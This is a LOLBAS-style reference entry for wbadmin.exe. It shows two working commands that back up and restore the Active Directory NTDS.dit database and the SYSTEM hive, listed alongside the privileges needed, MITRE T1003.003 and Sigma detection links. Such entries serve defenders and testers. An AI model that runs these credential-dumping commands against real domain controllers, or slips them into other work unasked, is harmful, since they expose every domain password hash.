---
Author: Chris Eastwood
Commands:
- Category: Dump
  Command: wbadmin start backup -backupTarget:{PATH_ABSOLUTE:folder} -include:C:\Windows\NTDS\NTDS.dit,C:\Windows\System32\config\SYSTEM
    -quiet
  Description: Extract NTDS.dit and SYSTEM hive into backup virtual hard drive file
    (.vhdx)
  MitreID: T1003.003
  OperatingSystem: Windows Server
  Privileges: Administrator, Backup Operators, SeBackupPrivilege
  Usecase: Snapshoting of Active Directory NTDS.dit database
- Category: Dump
  Command: wbadmin start recovery -version:<VERSIONIDENTIFIER> -recoverytarget:{PATH_ABSOLUTE:folder}
    -itemtype:file -items:C:\Windows\NTDS\NTDS.dit,C:\Windows\System32\config\SYSTEM
    -notRestoreAcl -quiet
  Description: Restore a version of NTDS.dit and SYSTEM hive into file path. The command
    `wbadmin get versions` can be used to find version identifiers.
  MitreID: T1003.003
  OperatingSystem: Windows Server
  Privileges: Administrator, Backup Operators, SeBackupPrivilege
  Usecase: Dumping of Active Directory NTDS.dit database
Created: 2024-04-05
Description: Windows Backup Administration utility
Detection:
- Sigma: https://github.com/SigmaHQ/sigma/blob/c7998c92b3c5f23ea67045bee8ee364d2ed1a775/rules/windows/process_creation/proc_creation_win_wbadmin_dump_sensitive_files.yml
- Sigma: https://github.com/SigmaHQ/sigma/blob/c7998c92b3c5f23ea67045bee8ee364d2ed1a775/rules/windows/process_creation/proc_creation_win_wbadmin_restore_file.yml
- Sigma: https://github.com/SigmaHQ/sigma/blob/c7998c92b3c5f23ea67045bee8ee364d2ed1a775/rules/windows/process_creation/proc_creation_win_wbadmin_restore_sensitive_files.yml
- IOC: wbadmin.exe command lines containing "NTDS" or "NTDS.dit"
Full_Path:
- Path: C:\Windows\System32\wbadmin.exe
Name: wbadmin.exe
Resources:
- Link: https://medium.com/r3d-buck3t/windows-privesc-with-sebackupprivilege-65d2cd1eb
mitre_data:
  technique_ids:
  - T1003.003
tags:
- lolbas/osbinaries
---

# wbadmin.exe

Windows Backup Administration utility

# Path(s)

- `C:\Windows\System32\wbadmin.exe`

# Dump Commands

Extract NTDS.dit and SYSTEM hive into backup virtual hard drive file (.vhdx)

```batch
wbadmin start backup -backupTarget:{PATH_ABSOLUTE:folder} -include:C:\Windows\NTDS\NTDS.dit,C:\Windows\System32\config\SYSTEM -quiet
```

- **Usecase:** Snapshoting of Active Directory NTDS.dit database
- **Privileges Required:** Administrator, Backup Operators, SeBackupPrivilege
- **MitreID:** `T1003.003`
- **Operating System(s):** Windows Server



Restore a version of NTDS.dit and SYSTEM hive into file path. The command `wbadmin get versions` can be used to find version identifiers.

```batch
wbadmin start recovery -version:<VERSIONIDENTIFIER> -recoverytarget:{PATH_ABSOLUTE:folder} -itemtype:file -items:C:\Windows\NTDS\NTDS.dit,C:\Windows\System32\config\SYSTEM -notRestoreAcl -quiet
```

- **Usecase:** Dumping of Active Directory NTDS.dit database
- **Privileges Required:** Administrator, Backup Operators, SeBackupPrivilege
- **MitreID:** `T1003.003`
- **Operating System(s):** Windows Server



# Resource(s)

- https://medium.com/r3d-buck3t/windows-privesc-with-sebackupprivilege-65d2cd1eb
# Acknowledgements

- Chris Eastwood (Authored, 2024-04-05)